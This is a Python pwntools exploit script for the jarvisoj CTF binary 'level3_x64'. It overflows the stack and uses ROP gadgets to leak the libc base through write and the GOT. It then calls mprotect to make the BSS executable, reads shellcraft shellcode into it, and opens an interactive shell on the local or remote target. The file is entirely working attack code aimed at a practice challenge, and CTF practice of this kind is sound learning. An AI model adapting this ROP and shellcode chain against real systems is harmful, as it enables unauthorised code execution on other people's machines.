#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level3_x64"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
elf = context.binary

if sys.argv[1] == "l":
    io = process("./level3_x64", env = {"LD_PRELOAD": "./libc-2.19.so"})
    #  libc = elf.libc
    libc = ELF("./libc-2.19.so")
else:
    io = remote("pwn2.jarvisoj.com", 9884)
    libc = ELF("./libc-2.19.so")

if __name__ == "__main__":
    '''
    0x00000000004006b3 : pop rdi ; ret
    0x00000000004006b1 : pop rsi ; pop r15 ; ret
    '''
    prdi = 0x00000000004006b3
    pprsi = 0x00000000004006b1
    leak = flat(cyclic(0x80 + 8), prdi, 1, pprsi, elf.got['write'], 0, elf.plt['write'], elf.sym['_start'])
    io.sendafter("Input:\n", leak)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
    success("libc -> {:#x}".format(libc.address))
    pause()

    '''
    0x0000000000024885: pop rsi; ret;
    0x0000000000001b8e: pop rdx; ret; 
    '''
    #  gdb.attach(io, "b *0x400619\nc")
    prsi = libc.address + 0x24885
    prdx = libc.address + 0x1b8e
    mprotect = flat(cyclic(0x80 + 8), prdi, 0x00600000, prsi, 0x1000, prdx, 7, libc.sym['mprotect'], elf.sym['_start'])
    io.sendafter("Input:\n", mprotect)
    pause()

    read = flat(cyclic(0x80 + 8), prdi, 0, prsi, elf.bss() + 0x500, prdx, 0x100, elf.plt['read'], elf.bss() + 0x500)
    io.sendafter("Input:\n", read)
    io.send(asm(shellcraft.sh()))
    
    io.interactive()
